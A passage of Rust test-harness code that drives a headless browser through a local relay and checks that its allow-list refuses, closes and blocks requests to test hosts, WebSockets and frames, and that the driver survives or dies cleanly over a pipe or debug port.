        let hop = |n: u8| format!("hop{n}.agent.test");
        relay.set_list(Some(vec![(hop(1), l)]));
        let adding = relay.clone();
        ex.on_main_document(Some(std::sync::Arc::new(move |h: &str, p: u16| {
            adding.allow(h, p)
        })));
        ex.arm_rule(
            (1..=3).map(|n| format!("http://{}:{l}", hop(n))).collect(),
            false,
        )
        .await?;
        let mut misses = Vec::new();
        let opened = ex.open(&format!("http://{}:{l}/start", hop(1))).await;
        if opened.is_err() {
            misses.push("chain".to_string());
        }
        ex.on_main_document(None);
        let here = ex
            .frame_url(&ex.main_frame().await?)
            .await
            .unwrap_or_default();
        if !here.starts_with(&format!("http://{}:{l}/end", hop(3))) {
            misses.push("not_on_hop3".to_string());
        }
        relay.set_list(Some(vec![(hop(3), l)]));
        let n0 = relay.refusals_of(&hop(1), l);
        let before = listener
            .host_counts()
            .map_err(|e| Fault::new("listener", e))?;
        ex.run_page_script(&format!(
            "(() => {{ fetch('http://{}:{l}/f', {{ mode: 'no-cors' }}).catch(() => {{}}); return true; }})()",
            hop(1)
        ))
        .await?;
        if !refused_after(&relay, &hop(1), l, n0).await {
            misses.push("earlier_hop_not_refused".to_string());
        }
        tokio::time::sleep(Duration::from_millis(1_000)).await;
        let after = listener
            .host_counts()
            .map_err(|e| Fault::new("listener", e))?;
        listener.stop();
        for n in 1..=2 {
            if before.get(&hop(n)).copied().unwrap_or(0) != 1 {
                misses.push(format!("hop{n}_count"));
            }
        }
        if before.get(&hop(3)).copied().unwrap_or(0) == 0 {
            misses.push("hop3_count".to_string());
        }
        if after.get(&hop(1)) != before.get(&hop(1)) {
            misses.push("hop1_reached_after".to_string());
        }
        if !alive(ex).await {
            misses.push("ended".to_string());
        }
        outcome(misses, None)
    }

    async fn list_close(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        let relay = relay_of(ctx)?;
        let listener = chain_listener(ctx)?;
        let l = listener.port;
        let moments = ["chain", "handback", "new-origin", "finish"];
        let host = |m: &str| format!("{m}.close.agent.test");
        let mut list = fixture_list(ctx);
        list.extend(moments.iter().map(|m| (host(m), l)));
        relay.set_list(Some(list.clone()));
        ex.open(&ctx.u("/bill")).await?;
        let mut misses = Vec::new();
        for m in moments {
            let h = host(m);
            let fetch = format!(
                "(() => {{ fetch('http://{h}:{l}/f', {{ mode: 'no-cors' }}).catch(() => {{}}); return true; }})()"
            );
            ex.run_page_script(&fetch).await?;
            let deadline = Instant::now() + Duration::from_secs(5);
            let mut open = false;
            while Instant::now() < deadline {
                if relay
                    .open_tunnels()
                    .iter()
                    .any(|(oh, op)| *oh == h && *op == l)
                {
                    open = true;
                    break;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            if !open {
                misses.push(format!("open_{m}"));
                continue;
            }
            if m == "finish" {
                relay.set_list(Some(Vec::new()));
            } else {
                list.retain(|(lh, _)| *lh != h);
                relay.set_list(Some(list.clone()));
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
            let closed = relay.closed().iter().any(|(ch, cp)| *ch == h && *cp == l)
                && !relay
                    .open_tunnels()
                    .iter()
                    .any(|(oh, op)| *oh == h && *op == l);
            if !closed {
                misses.push(format!("closed_{m}"));
            }
            let n0 = relay.refusals_of(&h, l);
            ex.run_page_script(&fetch).await?;
            if !refused_after(&relay, &h, l, n0).await {
                misses.push(format!("refused_{m}"));
            }
        }
        listener.stop();
        outcome(misses, None)
    }

    async fn own_traffic(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        let relay = relay_of(ctx)?;
        tokio::time::sleep(Duration::from_secs(10)).await;
        let refusals = relay.refusals();
        let mut distinct: Vec<&HostPort> = refusals.iter().collect();
        distinct.sort();
        distinct.dedup();
        eprintln!(
            "own_traffic machine={} browser={} refused={} distinct={} tunnels={}",
            ctx.machine,
            ctx.kind,
            refusals.len(),
            distinct.len(),
            relay.tunnels()
        );
        let mut misses = Vec::new();
        if !alive(ex).await {
            misses.push("ended".to_string());
        }
        outcome(misses, None)
    }

    async fn ws_allowed_run(
        ex: &mut Executor,
        ctx: &Ctx,
        i: u32,
        policy: bool,
    ) -> Res<serde_json::Value> {
        let relay = relay_of(ctx)?;
        let dir = ctx.scratch.join(format!(
            "{}-ws-{}-{i}",
            std::process::id(),
            if policy { "policy" } else { "control" }
        ));
        let (cert, key) = make_certificate(&dir).map_err(|e| match e {
            CertFault::NoOpenssl => Fault::new("openssl", "no openssl"),
            CertFault::Failed(d) => Fault::new("certificate", d),
        })?;
        let program = ctx.repo.join("tools/r3-trials/web/ws-listener.mjs");
        let mut listener =
            Listener::start_ws(&program, &cert, &key).map_err(|e| Fault::new("listener", e))?;
        let first = listener
            .json_counts()
            .map_err(|e| Fault::new("listener", e))?;
        let port = |k: &str| first["ports"][k].as_u64().unwrap_or(0) as u16;
        let (p, q, r) = (port("http"), port("wss"), port("https"));
        for pt in [p, q, r] {
            relay.allow(UTILITY, pt);
        }
        let allowed = vec![
            format!("http://{UTILITY}:{p}"),
            format!("https://{UTILITY}:{r}"),
        ];
        if policy {
            ex.arm_rule_with_policy(allowed, false, WS_POLICY).await?;
        } else {
            ex.arm_rule(allowed, false).await?;
        }
        let opened = ex.open(&format!("http://{UTILITY}:{p}/page")).await;
        tokio::time::sleep(Duration::from_secs(5)).await;
        let counts = listener
            .json_counts()
            .map_err(|e| Fault::new("listener", e));
        listener.stop();
        opened?;
        let mut c = counts?;
        c["policy_counts"] = serde_json::to_value(ex.policy_counts()).unwrap_or_default();
        Ok(c)
    }

    const WS_CONTEXTS: [&str; 7] = [
        "page",
        "frame",
        "worker",
        "shared",
        "blank",
        "dataframe",
        "blobworker",
    ];

    fn ctx_count(c: &serde_json::Value, map: &str, ctx: &str) -> u64 {
        c[map][ctx].as_u64().unwrap_or(0)
    }

    async fn ws_allowed(ex: &mut Executor, ctx: &Ctx, i: u32) -> Res<Option<u128>> {
        let c = ws_allowed_run(ex, ctx, i, true).await?;
        let mut misses = Vec::new();
        for k in WS_CONTEXTS {
            if ctx_count(&c, "ws", k) > 0 {
                misses.push(format!("ws_{k}"));
            }
            if ctx_count(&c, "f", k) == 0 {
                misses.push(format!("fetch_{k}"));
            }
            if ctx_count(&c, "r", k) == 0 {
                misses.push(format!("data_blob_{k}"));
            }
        }
        let wss = c["wss_connections"].as_u64().unwrap_or(0);
        let https = c["https_connections"].as_u64().unwrap_or(0);
        if wss > 0 {
            misses.push("wss".to_string());
        }
        if https < WS_CONTEXTS.len() as u64 {
            misses.push("https_fetch".to_string());
        }
        eprintln!(
            "ws_allowed i={i} ws={} fetch={} data_blob={} wss_connections={wss} https_connections={https} policy={}",
            c["ws"],
            c["f"],
            c["r"],
            c["policy_counts"]
        );
        outcome(misses, None)
    }

    async fn ws_allowed_control(ex: &mut Executor, ctx: &Ctx, i: u32) -> Res<Option<u128>> {
        let c = ws_allowed_run(ex, ctx, i, false).await?;
        let arrived = WS_CONTEXTS
            .iter()
            .filter(|k| ctx_count(&c, "ws", k) > 0)
            .count();
        let wss = c["wss_connections"].as_u64().unwrap_or(0);
        eprintln!(
            "ws_allowed_control i={i} ws={} fetch={} wss_connections={wss}",
            c["ws"], c["f"]
        );
        if arrived == WS_CONTEXTS.len() && wss > 0 {
            Ok(None)
        } else {
            Err(Fault::new("check", format!("arrived_{arrived}_wss_{wss}")))
        }
    }

    async fn frame_doc(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        signin(ex, ctx).await?;
        let u = origin(UTILITY, ctx.port);
        ex.arm_rule(vec![u.clone(), origin(PAY, ctx.port)], false)
            .await?;
        ex.open(&ctx.u("/pay")).await?;
        let doc = ex
            .paused()
            .into_iter()
            .find(|p| p.path == "/frame" && p.resource == "Document");
        let Some(doc) = doc else {
            return Err(Fault::new("check", "no_frame_document"));
        };
        let main = ex.main_frame().await?;
        let mut misses = Vec::new();
        if doc.frame == *main.inner() {
            misses.push("frame_is_main".to_string());
        }
        match ex.parent_origin_of(&doc.frame).await? {
            Some(o) if o == u => {}
            _ => misses.push("page_origin".to_string()),
        }
        if doc.origin != origin(PAY, ctx.port) {
            misses.push("frame_origin".to_string());
        }
        outcome(misses, None)
    }

    async fn step(ex: &mut Executor, ctx: &Ctx, name: &str, i: u32) -> Res<Option<u128>> {
        let whole = |r: Res<()>| r.map(|_| None);
        match name {
            "signin_form" => whole(signin_form(ex, ctx).await),
            "table_read" => whole(table_read(ex, ctx).await),
            "form_fill" => whole(form_fill(ex, ctx).await),
            "payment_frame" => whole(payment_frame(ex, ctx).await),
            "file_upload" => whole(file_upload(ex, ctx, i).await),
            "session_expiry" => whole(session_expiry(ex, ctx).await),
            "changed_page_1" => whole(changed_page_1(ex, ctx).await),
            "block_request" => whole(block_request(ex, ctx).await),
            "credential_mark" => whole(credential_mark(ex, ctx).await),
            "payment_frame_isolated" => whole(payment_frame_isolated(ex, ctx).await),
            "changed_page_1_isolated" => whole(changed_page_1_isolated(ex, ctx).await),
            "block_popup" => block_popup(ex, ctx).await,
            "block_frame_post" => block_frame_post(ex, ctx).await,
            "block_websocket" => block_websocket(ex, ctx).await,
            "cert_error" => cert_error(ex, ctx, i).await,
            "list_refuse" => list_refuse(ex, ctx).await,
            "list_hops" => list_hops(ex, ctx).await,
            "list_close" => list_close(ex, ctx).await,
            "own_traffic" => own_traffic(ex, ctx).await,
            "ws_allowed" => ws_allowed(ex, ctx, i).await,
            "ws_allowed_control" => ws_allowed_control(ex, ctx, i).await,
            "frame_doc" => frame_doc(ex, ctx).await,
            _ => Err(Fault::new("usage", name.to_string())),
        }
    }

    struct Run {
        ok: bool,
        cause: String,
        ms: u128,
        version: String,
        peers: Option<(u32, u32)>,
    }

    #[cfg(unix)]
    fn socket_owners(port: u16) -> Option<Vec<u32>> {
        let out = std::process::Command::new("lsof")
            .args(["-nP", &format!("-iTCP:{port}"), "-sTCP:ESTABLISHED", "-Fpn"])
            .output()
            .ok()?;
        let suffix = format!("->127.0.0.1:{port}");
        let mut pid = 0;
        let mut owners = Vec::new();
        for line in String::from_utf8_lossy(&out.stdout).lines() {
            if let Some(p) = line.strip_prefix('p') {
                pid = p.parse().unwrap_or(0);
            } else if let Some(n) = line.strip_prefix('n') {
                if n.ends_with(&suffix) {
                    owners.push(pid);
                }
            }
        }
        Some(owners)
    }

    #[cfg(windows)]
    fn socket_owners(port: u16) -> Option<Vec<u32>> {
        let out = std::process::Command::new("netstat")
            .args(["-ano", "-p", "TCP"])
            .output()
            .ok()?;
        let suffix = format!(":{port}");
        let mut owners = Vec::new();
        for line in String::from_utf8_lossy(&out.stdout).lines() {
            let cols: Vec<&str> = line.split_whitespace().collect();
            if cols.len() == 5 && cols[3] == "ESTABLISHED" && cols[2].ends_with(&suffix) {
                if let Ok(pid) = cols[4].parse() {
                    owners.push(pid);
                }
            }
        }
        Some(owners)
    }

    fn fixture_peers(port: u16) -> Option<(u32, u32)> {
        let me = std::process::id();
        let owners = socket_owners(port)?;
        let own = owners.iter().filter(|p| **p == me).count() as u32;
        Some((owners.len() as u32, own))
    }

    struct NotRun {
        cause: &'static str,
        detail: String,
    }

    impl NotRun {
        fn new(cause: &'static str, detail: impl Into<String>) -> Self {
            NotRun {
                cause,
                detail: detail.into(),
            }
        }
    }

    async fn run_once(ctx: &Ctx, name: &str, i: u32) -> Result<Run, NotRun> {
        if ctx.stop.is_set() {
            return Err(NotRun::new("signal", ""));
        }
        ctx.control
            .reset(variants_of(name))
            .map_err(|e| NotRun::new("fixture", e))?;
        if ctx.round2 {
            if let Some(r) = &ctx.relay {
                r.set_list(Some(fixture_list(ctx)));
            }
        }
        let opts = ctx.options(&format!("p-{name}-{i}"), None);
        let started = if ctx.round2 {
            ctx.stop.or(Executor::start_settled(&opts)).await
        } else {
            ctx.stop.or(Executor::start(&opts)).await
        };
        let mut ex = match started {
            Ok(ex) => ex,
            Err(f) if f.0 == "signal" => return Err(NotRun::new("signal", "")),
            Err(f) => {
                eprintln!(
                    "start step={name} i={i} cause={} detail={}",
                    f.0,
                    printable(&f.1)
                );
                return Err(NotRun::new("browser_start", ""));
            }
        };
        let version = ex.version().await.unwrap_or_else(|_| "-".into());
        let t0 = Instant::now();
        let outcome = ctx.stop.or(step(&mut ex, ctx, name, i)).await;
        let ms = match &outcome {
            Ok(Some(from_action)) => *from_action,
            _ => t0.elapsed().as_millis(),
        };
        let peers = if ctx.routes {
            fixture_peers(ctx.port)
        } else {
            None
        };
        let faults = ex.attach_faults();
        if !faults.is_empty() {
            eprintln!(
                "attach_faults step={name} i={i} n={} first={}",
                faults.len(),
                printable(&faults[0])
            );
        }
        ex.stop_and_remove().await;
        if let Err(f) = &outcome {
            if f.0 == "signal" {
                return Err(NotRun::new("signal", ""));
            }
            eprintln!(
                "miss step={name} i={i} cause={} detail={}",
                f.0,
                printable(&f.1)
            );
            if f.0 == "control" {
                return Err(NotRun::new(
                    "fixture",
                    format!("control during the run: {}", printable(&f.1)),
                ));
            }
        }
        Ok(Run {
            ok: outcome.is_ok(),
            cause: outcome.err().map(|f| f.0.to_string()).unwrap_or("-".into()),
            ms,
            version,
            peers,
        })
    }

    async fn cells(ctx: &Ctx, steps: &[&str], runs: u32) -> bool {
        let mut all_ran = true;
        for name in steps {
            if *name == "cert_error" && !openssl_runs() {
                out(&format!(
                    "notrun candidate={CANDIDATE} machine={} browser={} step={name} cause=openssl",
                    ctx.machine, ctx.kind
                ));
                all_ran = false;
                continue;
            }
            let mut ok = 0;
            let mut peers = (0u32, 0u32);
            let mut times = Vec::new();
            let mut majors = Vec::new();
            let mut ran = true;
            for i in 1..=runs {
                match run_once(ctx, name, i).await {
                    Ok(r) => {
                        out(&format!(
                            "run candidate={CANDIDATE} machine={} browser={} step={name} i={i} result={} ms={} version={} cause={}",
                            ctx.machine,
                            ctx.kind,
                            if r.ok { "ok" } else { "miss" },
                            r.ms,
                            r.version.replace(' ', "_"),
                            r.cause
                        ));
                        if let Some((all, own)) = r.peers {
                            peers.0 += all;
                            peers.1 += own;
                        }
                        if r.ok {
                            ok += 1;
                            times.push(r.ms);
                        }
                        if let Some(m) = major_of(&r.version) {
                            majors.push(m);
                        }
                    }
                    Err(e) => {
                        if !e.detail.is_empty() {
                            eprintln!("control: {}", printable(&e.detail));
                        }
                        out(&format!(
                            "notrun candidate={CANDIDATE} machine={} browser={} step={name} cause={}",
                            ctx.machine, ctx.kind, e.cause
                        ));
                        ran = false;
                        break;
                    }
                }
            }
            if !ran {
                all_ran = false;
                if ctx.stop.is_set() {
                    break;
                }
                continue;
            }
            majors.sort_unstable();
            majors.dedup();
            let Some(major) = majors.first() else {
                out(&format!(
                    "notrun candidate={CANDIDATE} machine={} browser={} step={name} cause=version",
                    ctx.machine, ctx.kind
                ));
                all_ran = false;
                continue;
            };
            if majors.len() > 1 {
                out(&format!(
                    "note step={name} majors={}",
                    majors
                        .iter()
                        .map(|m| m.to_string())
                        .collect::<Vec<_>>()
                        .join(",")
                ));
            }
            if *name == "own_traffic" || *name == "ws_allowed" {
                out(&format!(
                    "way row={name} machine={} browser={} closed={} runs={runs}",
                    ctx.machine,
                    ctx.kind,
                    if ok == runs { "yes" } else { "no" }
                ));
                continue;
            }
            if *name == "frame_doc" {
                out(&format!(
                    "way row=frame_doc form=port_relay machine={} browser={} closed={} runs={runs} told={ok}",
                    ctx.machine,
                    ctx.kind,
                    if ok == runs { "yes" } else { "no" }
                ));
                continue;
            }
            if *name == "ws_allowed_control" {
                out(&format!(
                    "control row=ws_allowed machine={} browser={} arrived_runs={ok} runs={runs}",
                    ctx.machine, ctx.kind
                ));
                continue;
            }
            out(&format!(
                "cell candidate={CANDIDATE} machine={} browser={} major={major} step={name} ok={ok} of={runs} median_ms={}",
                ctx.machine,
                ctx.kind,
                median(&mut times)
            ));
            if ctx.round2 && ctx.relayed && STEPS.contains(name) {
                out(&format!(
                    "relay_cell machine={} browser={} form=port_relay step={name} ok={ok} of={runs}",
                    ctx.machine, ctx.kind
                ));
            }
            if ctx.routes {
                out(&format!(
                    "route candidate={CANDIDATE} machine={} browser={} step={name} relay={} fixture_conns={} from_driver={} from_other={}",
                    ctx.machine,
                    ctx.kind,
                    if ctx.relayed { "yes" } else { "no" },
                    peers.0,
                    peers.1,
                    peers.0 - peers.1
                ));
            }
        }
        all_ran
    }

    async fn cold_start(ctx: &Ctx, i: u32) -> Res<u128> {
        ctx.control
            .reset(&[])
            .map_err(|e| Fault::new("control", e))?;
        let t0 = Instant::now();
        let mut ex = ctx
            .stop
            .or(Executor::start(&ctx.options(&format!("p-cold-{i}"), None)))
            .await?;
        let opened = ctx.stop.or(ex.open(&ctx.u("/signin"))).await;
        let ms = t0.elapsed().as_millis();
        ex.stop_and_remove().await;
        opened.map(|_| ms)
    }

    async fn record(ctx: &Ctx) -> Res<()> {
        ctx.control
            .reset(&[])
            .map_err(|e| Fault::new("control", e))?;
        let mut ex = ctx
            .stop
            .or(Executor::start(&ctx.options("p-record", None)))
            .await?;
        let outcome = ctx
            .stop
            .or(async {
                ex.add_recorder().await?;
                signin(&mut ex, ctx).await?;
                let link = ex.resolve_one(&[role("link", "Pay bill")], &[]).await?;
                click_and_wait(&mut ex, &link).await?;
                let deadline = Instant::now() + Duration::from_secs(5);
                loop {
                    let events: Vec<serde_json::Value> = ex
                        .recorded()
                        .iter()
                        .filter_map(|p| serde_json::from_str(p).ok())
                        .collect();
                    let typed = events.iter().any(|e| {
                        e["kind"] == "input"
                            && e["role"] == "textbox"
                            && e["name"] == "Email"
                            && e["testid"] == "email"
                    });
                    let clicked = events.iter().any(|e| {
                        e["kind"] == "click"
                            && e["role"] == "link"
                            && e["name"] == "Pay bill"
                            && e["testid"] == "pay-bill"
                    });
                    if typed && clicked {
                        return Ok(());
                    }
                    if Instant::now() > deadline {
                        return Err(Fault::new("check", "recorded"));
                    }
                    tokio::time::sleep(Duration::from_millis(50)).await;
                }
            })
            .await;
        ex.stop_and_remove().await;
        outcome
    }

    async fn attach(ctx: &Ctx) -> Res<()> {
        ctx.control
            .reset(&[])
            .map_err(|e| Fault::new("control", e))?;
        let debug = ctx.port + 1;
        let mut ex = ctx
            .stop
            .or(Executor::start(&ctx.options("p-attach", Some(debug))))
            .await?;
        let outcome = ctx
            .stop
            .or(async {
                signin(&mut ex, ctx).await?;
                let mut second =
                    Executor::connect(&format!("127.0.0.1:{debug}"), &ctx.u("/bill")).await?;
                let heading = second.resolve(&[role("heading", "Your bill")], &[]).await;
                second.stop().await;
                check(matches!(heading?, Resolved::One { .. }), "heading")
            })
            .await;
        ex.stop_and_remove().await;
        outcome
    }

    async fn extras(ctx: &Ctx, added_bytes: u64) -> bool {
        let mut colds = Vec::new();
        let mut faults = Vec::new();
        for i in 1..=10 {
            match cold_start(ctx, i).await {
                Ok(ms) => colds.push(ms),
                Err(f) => faults.push(("cold", f)),
            }
        }
        let rec = record(ctx).await;
        if let Err(f) = &rec {
            faults.push(("record", f.clone()));
        }
        let att = attach(ctx).await;
        if let Err(f) = &att {
            faults.push(("attach", f.clone()));
        }
        for (part, f) in &faults {
            eprintln!("{part} cause={} detail={}", f.0, printable(&f.1));
        }
        let stopped = ctx.stop.is_set();
        let unmeasured =
            stopped || colds.len() < 10 || faults.iter().any(|(_, f)| f.0 == "control");
        if unmeasured {
            out(&format!(
                "notrun candidate={CANDIDATE} machine={} browser={} cell=extras cause={}",
                ctx.machine,
                ctx.kind,
                if stopped {
                    "signal"
                } else if colds.len() < 10 {
                    "cold_start"
                } else {
                    "fixture"
                }
            ));
            return false;
        }
        out(&format!(
            "extras candidate={CANDIDATE} added_bytes={added_bytes} cold_ms={} record={} attach={} pipe=no",
            median(&mut colds),
            if rec.is_ok() { "ok" } else { "miss" },
            if att.is_ok() { "ok" } else { "miss" }
        ));
        true
    }

    fn printable(detail: &str) -> String {
        let token = detail.replace(' ', "_");
        let safe = token.len() <= 64
            && token
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"_:.-".contains(&b));
        if safe {
            token
        } else {
            format!("text_of_{}_bytes", detail.len())
        }
    }

    async fn resolver(ctx: &Ctx) -> Res<()> {
        ctx.control
            .reset(&[])
            .map_err(|e| Fault::new("control", e))?;
        let mut ex = ctx
            .stop
            .or(Executor::start(&ctx.options("p-resolver", None)))
            .await?;
        let outcome = ctx
            .stop
            .or(async {
                let t0 = counter(ctx, &["requests", "total"])?;
                let other = ex
                    .navigate_error(&format!(
                        "http://halvo-resolver-probe.localhost:{}/",
                        ctx.port
                    ))
                    .await?;
                let t1 = counter(ctx, &["requests", "total"])?;
                ex.open(&ctx.u("/signin")).await?;
                let t2 = counter(ctx, &["requests", "total"])?;
                out(&format!(
                    "resolver other_name_error={} other_name_requests={} test_name_requests={}",
                    other.unwrap_or("none".into()).replace(' ', "_"),
                    t1 - t0,
                    t2 - t1
                ));
                Ok(())
            })
            .await;
        ex.stop_and_remove().await;
        outcome
    }

    async fn snapshot_pay(ctx: &Ctx, path: &Path) -> Res<()> {
        ctx.control
            .reset(&[])
            .map_err(|e| Fault::new("control", e))?;
        let mut ex = ctx
            .stop
            .or(Executor::start(&ctx.options("p-snapshot", None)))
            .await?;
        let outcome = ctx
            .stop
            .or(async {
                signin(&mut ex, ctx).await?;
                ex.open(&ctx.u("/pay")).await?;
                let lines = ex.snapshot().await?;
                let mut text = String::new();
                for l in &lines {
                    text.push_str(&l.render());
                    text.push('\n');
                }
                std::fs::write(path, text).map_err(|e| Fault::new("file", e.to_string()))?;
                out(&format!("snapshot lines={}", lines.len()));
                Ok(())
            })
            .await;
        ex.stop_and_remove().await;
        outcome
    }

    const HELD_PATH: &str = "/held";
    const KILL_WATCH: Duration = Duration::from_secs(10);
    const CHILD_WAIT: Duration = Duration::from_secs(60);
    const CHILD_LIFE: Duration = Duration::from_secs(120);
    const CLOSE_WAIT: Duration = Duration::from_secs(15);

    #[derive(Clone, Copy, PartialEq, Eq)]
    enum Channel {
        Pipe,
        Port,
    }

    struct Form {
        step: &'static str,
        channel: Channel,
        relay: bool,
    }

    const FORMS: [Form; 4] = [
        Form {
            step: "driver_killed_pipe",
            channel: Channel::Pipe,
            relay: false,
        },
        Form {
            step: "driver_killed_port",
            channel: Channel::Port,
            relay: false,
        },
        Form {
            step: "driver_killed_pipe_relay",
            channel: Channel::Pipe,
            relay: true,
        },
        Form {
            step: "driver_killed_port_relay",
            channel: Channel::Port,
            relay: true,
        },
    ];

    struct ChildArgs {
        browser: PathBuf,
        profile: PathBuf,
        page: String,
        target: String,
        allow: Vec<String>,
        let_through: bool,
        channel: Channel,
        relay: bool,
        round2: bool,
    }

    fn child_args(argv: &[String]) -> Result<ChildArgs, String> {
        let mut browser = None;
        let mut profile = None;
        let mut page = None;
        let mut target = None;
        let mut allow = Vec::new();
        let mut let_through = None;
        let mut channel = None;
        let mut relay = None;
        let mut round2 = false;
        let mut i = 0;
        while i < argv.len() {
            let value = argv
                .get(i + 1)
                .cloned()
                .ok_or_else(|| format!("{} needs a value", argv[i]))?;
            match argv[i].as_str() {
                "--browser" => browser = Some(PathBuf::from(value)),
                "--profile" => profile = Some(PathBuf::from(value)),
                "--page" => page = Some(value),
                "--target" => target = Some(value),
                "--allow" => allow.push(value),
                "--let-through" => let_through = Some(value == "yes"),
                "--relay" => relay = Some(value == "yes"),
                "--round2" => round2 = value == "yes",
                "--channel" => {
                    channel = Some(match value.as_str() {
                        "pipe" => Channel::Pipe,
                        "port" => Channel::Port,
                        _ => return Err("--channel takes pipe or port".into()),
                    })
                }
                other => return Err(format!("unknown argument {other}")),
            }
            i += 2;
        }
        Ok(ChildArgs {
            browser: browser.ok_or("--browser is required")?,
            profile: profile.ok_or("--profile is required")?,
            page: page.ok_or("--page is required")?,
            target: target.ok_or("--target is required")?,
            allow,
            let_through: let_through.ok_or("--let-through is required")?,
            channel: channel.ok_or("--channel is required")?,
            relay: relay.ok_or("--relay is required")?,
            round2,
        })
    }

    fn held_script(target: &str) -> String {
        format!(
            "(() => {{ fetch({}, {{method: 'POST', body: 'halvo-held-request', mode: 'no-cors'}}).catch(() => {{}}); return true; }})()",
            serde_json::Value::String(target.to_string())
        )
    }

    /// The driver of the rows `driver_killed_*`: starts the browser over the pipe or the port,
    /// with or without the relay in its own process, holds or lets through one POST to the
    /// target, prints `paused`, and waits to be killed; it gives up after `CHILD_LIFE`.
    pub fn child_main(argv: &[String]) -> ExitCode {
        let a = match child_args(argv) {
            Ok(a) => a,
            Err(e) => {
                eprintln!("REFUSED usage: {e}");
                return ExitCode::from(2);
            }
        };
        let rt = match tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(_) => return ExitCode::from(1),
        };
        let mut flags: Vec<String> = FIRST_FLAGS.iter().map(|s| s.to_string()).collect();
        flags.push(RESOLVER_RULE.to_string());
        let relay = if a.relay {
            match rt.block_on(Relay::start()) {
                Ok(r) => {
                    flags.extend(relay_flags(r.port));
                    if a.round2 {
                        let list: Vec<HostPort> = [&a.page, &a.target]
                            .iter()
                            .filter_map(|u| r3_web::cdp::host_port(&r3_web::cdp::split_url(u).0))
                            .collect();
                        r.handle().set_list(Some(list));
                    }
                    Some(r)
                }
                Err(e) => {
                    eprintln!("driver relay {}", e.kind());
                    return ExitCode::from(1);
                }
            }
        } else {
            None
        };
        if a.round2 {
            flags.extend(ROUND2_FLAGS.iter().map(|f| f.to_string()));
        }
        let code = match a.channel {
            Channel::Port => rt.block_on(port_child(&a, flags)),
            Channel::Pipe => pipe_child(&a, flags),
        };
        drop(relay);
        code
    }

    async fn port_child(a: &ChildArgs, flags: Vec<String>) -> ExitCode {
        let opts = StartOptions {
            browser: a.browser.clone(),
            profile: a.profile.clone(),
            headless: true,
            flags,
            debug_port: None,
        };
        let started = if a.round2 {
            Executor::start_settled(&opts).await
        } else {
            Executor::start(&opts).await
        };
        let mut ex = match started {
            Ok(ex) => ex,
            Err(f) => {
                eprintln!("driver start cause={} detail={}", f.0, printable(&f.1));
                return ExitCode::from(1);
            }
        };
        out(&format!(
            "started browser_pid={} version={}",
            ex.pid().unwrap_or(0),
            ex.version()
                .await
                .unwrap_or_else(|_| "-".into())
                .replace(' ', "_")
        ));
        out(&format!("address {}", ex.debug_address()));
        let held = async {
            ex.open(&a.page).await?;
            if a.let_through {
                ex.arm_rule(a.allow.clone(), true).await?;
            } else {
                ex.hold_requests(a.allow.clone()).await?;
            }
            ex.run_page_script(&held_script(&a.target)).await?;
            let deadline = Instant::now() + r3_web::cdp::STEP_TIMEOUT;
            loop {
                if let Some(p) = ex.paused().into_iter().find(|p| p.path == HELD_PATH) {
                    return Ok(p.outcome);
                }
                if Instant::now() > deadline {
                    return Err(Fault::new("timeout", "paused"));
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        }
        .await;
        match held {
            Ok(outcome) => {
                out(&format!("paused outcome={outcome:?}"));
                tokio::time::sleep(CHILD_LIFE).await;
                ex.stop_and_remove().await;
                ExitCode::from(3)
            }
            Err(f) => {
                eprintln!("driver step cause={} detail={}", f.0, printable(&f.1));
                ex.stop_and_remove().await;
                ExitCode::from(1)
            }
        }
    }

    fn pipe_child(a: &ChildArgs, mut flags: Vec<String>) -> ExitCode {
        let mut temp = a.profile.clone().into_os_string();
        temp.push("-tmp");
        let temp = PathBuf::from(temp);
        if std::fs::create_dir(&a.profile).is_err() || std::fs::create_dir(&temp).is_err() {
            eprintln!("driver pipe dirs");
            return ExitCode::from(1);
        }
        if a.round2 && r3_web::cdp::write_agent_settings(&a.profile).is_err() {
            eprintln!("driver pipe settings");
            return ExitCode::from(1);
        }
        flags.push("--headless=new".into());
        flags.push("--remote-debugging-pipe".into());
        flags.push(format!("--user-data-dir={}", a.profile.display()));
        if cfg!(target_os = "macos") {
            flags.push("--use-mock-keychain".into());
        }
        flags.push("about:blank".into());
        let mut b = match PipeBrowser::launch(&a.browser, &flags, &temp) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("driver pipe launch {}", printable(&e));
                return ExitCode::from(1);
            }
        };
        let let_through = a.let_through;
        let allow = a.allow.clone();
        let held: std::cell::Cell<Option<&'static str>> = std::cell::Cell::new(None);
        let mut on = |b: &mut PipeBrowser, m: &serde_json::Value| {
            if m["method"] != "Fetch.requestPaused" {
                return;
            }
            let p = &m["params"];
            let rid = p["requestId"].clone();
            let method = p["request"]["method"].as_str().unwrap_or("").to_string();
            let (origin, path) = r3_web::cdp::split_url(p["request"]["url"].as_str().unwrap_or(""));
            let session = m["sessionId"].as_str().map(str::to_string);
            let reads = matches!(method.as_str(), "GET" | "HEAD" | "OPTIONS");
            if path == HELD_PATH {
                if let_through {
                    b.send_only(
                        "Fetch.continueRequest",
                        serde_json::json!({"requestId": rid}),
                        session.as_deref(),
                    );
                    held.set(Some("Continued"));
                } else {
                    held.set(Some("Held"));
                }
            } else if allow.contains(&origin) && reads {
                b.send_only(
                    "Fetch.continueRequest",
                    serde_json::json!({"requestId": rid}),
                    session.as_deref(),
                );
            } else {
                b.send_only(
                    "Fetch.failRequest",
                    serde_json::json!({"requestId": rid, "errorReason": "BlockedByClient"}),
                    session.as_deref(),
                );
            }
        };
        let steps = (|| -> Result<(), String> {
            let v = b.call("Browser.getVersion", serde_json::json!({}), None, &mut on)?;
            out(&format!(
                "started browser_pid={} version={}",
                b.pid(),
                v["product"].as_str().unwrap_or("-").replace(' ', "_")
            ));
            let t = b.call("Target.getTargets", serde_json::json!({}), None, &mut on)?;
            let page = t["targetInfos"]
                .as_array()
                .and_then(|a| a.iter().find(|x| x["type"] == "page"))
                .and_then(|x| x["targetId"].as_str())
                .ok_or("no page")?
                .to_string();
            let s = b.call(
                "Target.attachToTarget",
                serde_json::json!({"targetId": page, "flatten": true}),
                None,
                &mut on,
            )?;
